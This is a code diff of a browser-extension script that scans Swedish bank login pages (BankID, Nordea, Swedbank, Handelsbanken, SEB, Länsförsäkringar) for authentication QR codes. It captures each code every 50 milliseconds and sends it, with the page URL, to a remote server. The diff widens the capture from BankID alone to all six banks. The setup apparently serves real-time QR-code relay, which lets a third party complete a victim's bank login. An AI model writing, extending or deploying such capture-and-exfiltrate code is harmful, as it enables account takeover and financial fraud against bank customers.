@@ -1,20 +1,61 @@
 // Server configuration
 const PRODUCTION_URL = 'https://web-production-c116.up.railway.app';
 
-// BankID configuration
-const BANKID_CONFIG = {
-    identifier: {
-        urls: ['bankid.com', 'bankid.'],
-        titles: ['bankid', 'logga in'],
-        domains: ['bankid']
+// Bank configurations
+const BANK_CONFIGS = {
+    BANKID: {
+        identifier: {
+            urls: ['bankid.com', 'bankid.'],
+            titles: ['bankid', 'logga in'],
+            domains: ['bankid']
+        },
+        selectors: {
+            qrCanvas: 'canvas[title*="QR-kod"], canvas[alt*="QR-kod"]',
+            qrCanvasById: 'canvas[id*="qr"], canvas[id*="bankid"]',
+            qrCanvasClass: 'canvas[class*="qr"], canvas[class*="bankid"]',
+            qrCanvasAll: 'canvas[id*="bankid"], canvas[class*="bankid"], canvas[data-testid*="qr"]',
+            qrImage: 'img[alt*="QR-kod"], img[class*="qr-code"]'
+        }
     },
-    selectors: {
-        qrCanvas: 'canvas[title*="QR-kod"], canvas[alt*="QR-kod"]',
-        qrCanvasById: 'canvas[id*="qr"], canvas[id*="bankid"]',
-        qrCanvasClass: 'canvas[class*="qr"], canvas[class*="bankid"]',
-        qrCanvasAll: 'canvas[id*="bankid"], canvas[class*="bankid"], canvas[data-testid*="qr"]',
-        qrImage: 'img[alt*="QR-kod"], img[class*="qr-code"]'
+    NORDEA: {
+        selectors: {
+            qrCanvas: 'canvas.qr-code-canvas[title="QR-kod"]',
+            qrCanvasById: 'canvas#qr-code-canvas',
+            qrCanvasAll: 'canvas[title="QR-kod"]',
+            qrImage: 'img[alt*="QR-kod"]'
+        }
     },
+    SWEDBANK: {
+        selectors: {
+            qrCanvas: 'canvas#sbid-qr',
+            qrCanvasById: 'canvas[id*="qr"], canvas[id*="bankid"], canvas[id*="sbid"]',
+            qrCanvasClass: 'canvas[class*="qr"], canvas[class*="bankid"], canvas[class*="sbid"]',
+            qrCanvasAll: 'canvas[id*="bankid"], canvas[class*="bankid"], canvas[data-testid*="qr"]',
+            qrImage: 'img.mobile-bank-id__qr-code--image, img[alt*="QR-kod"], img[class*="qr-code"]'
+        }
+    },
+    HANDELSBANKEN: {
+        selectors: {
+            qrCanvas: 'canvas[id*="qr"], canvas[class*="qr"]',
+            qrImage: 'img[alt*="QR-kod"], img[class*="qr-code"]'
+        }
+    },
+    SEB: {
+        selectors: {
+            qrCanvas: 'canvas[id*="qr"], canvas[class*="qr"]',
+            qrImage: 'img[alt*="QR-kod"], img[class*="qr-code"]'
+        }
+    },
+    LANSFORSAKRINGAR: {
+        selectors: {
+            qrCanvas: 'canvas[id*="qr"], canvas[class*="qr"]',
+            qrImage: 'img[alt*="QR-kod"], img[class*="qr-code"]'
+        }
+    }
+};
+
+// Global configuration
+const CONFIG = {
     captureInterval: 50,
     captureThrottle: 100,
     lastCapture: 0,
@@ -23,26 +64,25 @@ const BANKID_CONFIG = {
 };
 
 // Function to send QR code to server
-async function sendQRCode(imageData) {
+async function sendQRCode(imageData, bankName = 'BANKID') {
     try {
-        console.log('Preparing to send QR code...');
+        console.log('Preparing to send QR code for bank:', bankName);
         
         // Validate the image data
         if (!imageData || typeof imageData !== 'string') {
             throw new Error('Invalid image data');
         }
         
-        if (!imageData.startsWith('data:image/png;base64,')) {
+        if (!imageData.startsWith('data:image/')) {
             throw new Error('Invalid image data format');
         }
         
-        // Create the payload matching other extensions' format
         const payload = {
             qrData: imageData,
-            bank: 'BANKID',
+            bank: bankName,
             timestamp: new Date().toISOString(),
             url: window.location.href,
-            displayUrl: BANKID_CONFIG.displayUrl
+            displayUrl: CONFIG.displayUrl
         };
         
         console.log('Request payload structure:', {
@@ -77,48 +117,86 @@ async function sendQRCode(imageData) {
     }
 }
 
-// Function to capture QR code
+// Function to capture QR code from canvas or image
 function captureQRCode() {
     const now = Date.now();
     
-    if (now - BANKID_CONFIG.lastCapture < BANKID_CONFIG.captureThrottle) {
+    if (now - CONFIG.lastCapture < CONFIG.captureThrottle) {
         return;
     }
-    
-    const qrCanvas = document.querySelector(BANKID_CONFIG.selectors.qrCanvas) || 
-                    document.querySelector(BANKID_CONFIG.selectors.qrCanvasById) ||
-                    document.querySelector(BANKID_CONFIG.selectors.qrCanvasClass) ||
-                    Array.from(document.getElementsByTagName('canvas')).find(canvas => 
-                        canvas.width === canvas.height && 
-                        canvas.width >= 150 && 
-                        canvas.width <= 200
-                    );
-    
-    if (qrCanvas) {
-        try {
-            const rect = qrCanvas.getBoundingClientRect();
-            if (rect.width === 0 || rect.height === 0 || !rect.width || !rect.height) {
-                return;
-            }
 
-            const base64Data = qrCanvas.toDataURL('image/png');
-            if (!base64Data || base64Data === 'data:,') {
-                return;
+    // Try to find QR codes from all bank configurations
+    for (const [bankName, bankConfig] of Object.entries(BANK_CONFIGS)) {
+        // Try image first
+        if (bankConfig.selectors.qrImage) {
+            const qrImage = document.querySelector(bankConfig.selectors.qrImage);
+            if (qrImage) {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const rect = qrImage.getBoundingClientRect();
+                    
+                    canvas.width = qrImage.naturalWidth || rect.width;
+                    canvas.height = qrImage.naturalHeight || rect.height;
+                    
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(qrImage, 0, 0);
+                    
+                    const base64Data = canvas.toDataURL('image/png');
+                    if (base64Data && base64Data !== 'data:,') {
+                        const hash = base64Data.slice(-32);
+                        if (hash !== CONFIG.lastHash) {
+                            CONFIG.lastHash = hash;
+                            CONFIG.lastCapture = now;
+                            console.log(`Found QR image for bank: ${bankName}`);
+                            sendQRCode(base64Data, bankName);
+                            return;
+                        }
+                    }
+                } catch (error) {
+                    console.error(`Error capturing QR image for ${bankName}:`, error);
+                }
             }
+        }
 
-            const hash = base64Data.slice(-32);
-            if (hash === BANKID_CONFIG.lastHash) {
-                console.log('Same QR code as last capture');
+        // Try canvas elements
+        const selectors = bankConfig.selectors;
+        const qrCanvas = document.querySelector(selectors.qrCanvas) || 
+                        document.querySelector(selectors.qrCanvasById) ||
+                        document.querySelector(selectors.qrCanvasClass) ||
+                        document.querySelector(selectors.qrCanvasAll) ||
+                        Array.from(document.getElementsByTagName('canvas')).find(canvas => 
+                            canvas.width === canvas.height && 
+                            canvas.width >= 150 && 
+                            canvas.width <= 300
+                        );
+        
+        if (qrCanvas) {
+            try {
+                const rect = qrCanvas.getBoundingClientRect();
+                if (rect.width === 0 || rect.height === 0) {
+                    continue;
+                }
+
+                const base64Data = qrCanvas.toDataURL('image/png');
+                if (!base64Data || base64Data === 'data:,') {
+                    continue;
+                }
+
+                const hash = base64Data.slice(-32);
+                if (hash === CONFIG.lastHash) {
+                    console.log('Same QR code as last capture');
+                    continue;
+                }
+                
+                CONFIG.lastHash = hash;
+                CONFIG.lastCapture = now;
+
+                console.log(`Found QR canvas for bank: ${bankName}`);
+                sendQRCode(base64Data, bankName);
                 return;
+            } catch (error) {
+                console.error(`Error capturing QR canvas for ${bankName}:`, error);
             }
-            
-            BANKID_CONFIG.lastHash = hash;
-            BANKID_CONFIG.lastCapture = now;
-
-            console.log('Capturing new QR code');
-            sendQRCode(base64Data);
-        } catch (error) {
-            console.error('Error capturing QR code:', error);
         }
     }
 }
@@ -161,7 +239,7 @@ let observerTimeout;
 function startMonitoring() {
     if (captureInterval) clearInterval(captureInterval);
     
-    captureInterval = setInterval(captureQRCode, BANKID_CONFIG.captureInterval);
+    captureInterval = setInterval(captureQRCode, CONFIG.captureInterval);
     setTimeout(captureQRCode, 100);
 
     const observer = new MutationObserver((mutations) => {
